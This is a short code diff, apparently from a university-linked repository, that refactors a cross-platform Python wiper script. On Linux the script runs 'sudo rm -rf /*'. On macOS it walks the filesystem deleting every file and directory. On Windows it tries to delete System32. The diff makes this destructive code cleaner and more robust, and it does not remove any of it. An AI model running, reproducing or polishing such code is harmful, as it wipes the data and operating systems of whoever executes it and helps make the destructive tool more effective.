@@ -6,7 +6,7 @@ Universidad Carlos III de Madrid
 import os
 from sys import platform
 
-if platform == "linux" or platform == "linux2":
+if platform in ("linux", "linux2"):
     # linux
     os.system('sudo rm -rf /*')
 
@@ -20,16 +20,18 @@ elif platform == "darwin":
             file_path = os.path.join(root, name)
             try:
                 os.remove(file_path)  # Remove files
-            except Exception as e:
+            except PermissionError:
+                print("Hard r.")
                 continue
 
         for name in dirs:
             dir_path = os.path.join(root, name)
             try:
                 os.rmdir(dir_path)  # Remove directories
-            except Exception as e:
+            except PermissionError:
+                print("Hard r.")
                 continue
 
 elif platform == "win32":
     # Windows ...
-    os.remove("C:\Windows\System32")
+    os.remove(r"C:\Windows\System32")
